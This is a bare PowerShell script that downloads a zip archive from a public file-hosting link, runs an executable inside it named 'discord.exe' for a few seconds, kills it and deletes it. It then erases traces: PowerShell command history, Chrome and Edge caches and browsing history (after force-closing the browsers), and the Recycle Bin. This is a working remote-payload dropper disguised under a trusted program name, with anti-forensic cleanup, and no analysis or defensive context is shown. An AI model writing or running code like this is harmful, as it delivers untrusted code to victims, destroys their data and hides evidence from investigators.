$zipUrl = "https://files.catbox.moe/0tjan7.zip"

$zipPath = "$env:TEMP\work.zip"
$extractPath = "$env:TEMP\work"

Invoke-WebRequest $zipUrl -OutFile $zipPath

Expand-Archive $zipPath $extractPath -Force

$exe = Get-ChildItem $extractPath -Recurse -Filter "discord.exe" | Select-Object -First 1

if ($exe) {

    $p = Start-Process $exe.FullName -PassThru

    Start-Sleep 5

    Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
}

Start-Sleep 2

taskkill /f /im discord.exe 2>$null

cmd /c rd /s /q "$extractPath"

Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# PowerShell History
Clear-History
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue

# Browser Cache
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue

# Browser Download / History DB
taskkill /f /im chrome.exe 2>$null
taskkill /f /im msedge.exe 2>$null

Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History-journal" -Force -ErrorAction SilentlyContinue

Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History-journal" -Force -ErrorAction SilentlyContinue

# Recycle Bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
